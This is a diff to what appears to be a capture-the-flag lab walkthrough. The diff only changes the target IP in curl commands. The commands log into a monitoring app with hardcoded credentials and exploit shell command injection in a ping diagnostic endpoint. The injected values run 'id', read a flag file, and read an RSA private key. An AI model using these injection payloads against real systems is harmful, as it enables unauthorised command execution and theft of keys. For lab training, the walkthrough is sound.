@@ -13,7 +13,7 @@
 ```bash
 # Via browser: http://<M2-IP>:8080/login
 # OR via curl:
-curl -s -X POST http://172.24.4.51:8080/login \
+curl -s -X POST http://11.0.1.215:8080/login \
   -c /tmp/cookies2.txt \
   -d "username=monitor_admin&password=S1GN4L#Mon!tor"
 ```
@@ -30,7 +30,7 @@ Navigate to **DIAGNOSTICS → Node Reachability Check** and test:
 
 ```bash
 # Via curl with session cookie:
-curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
+curl -s -X POST http://11.0.1.215:8080/api/diagnostic/ping \
   -b /tmp/cookies2.txt \
   -H "Content-Type: application/json" \
   -d '{"host":"127.0.0.1; id"}'
@@ -45,7 +45,7 @@ The `host` parameter is passed to `ping -c 3 -W 2 <host>` via `shell=True`.
 ## Step 3 — Read Flag
 
 ```bash
-curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
+curl -s -X POST http://11.0.1.215:8080/api/diagnostic/ping \
   -b /tmp/cookies2.txt \
   -H "Content-Type: application/json" \
   -d '{"host":"127.0.0.1; cat /opt/sigmon/classified/flag2.txt"}'
@@ -63,7 +63,7 @@ curl -s -X POST http://<M2-IP>:8080/api/diagnostic/ping \
   -d '{"host":"127.0.0.1; cat /opt/monitor/keys/sigops_rsa"}'
 
 # OR
-curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
+curl -s -X POST http://11.0.1.215:8080/api/diagnostic/ping \
   -b /tmp/cookies2.txt \
   -H "Content-Type: application/json" \
   -d '{"host":"127.0.0.1; cat /opt/monitor/keys/sigops_rsa"}' \
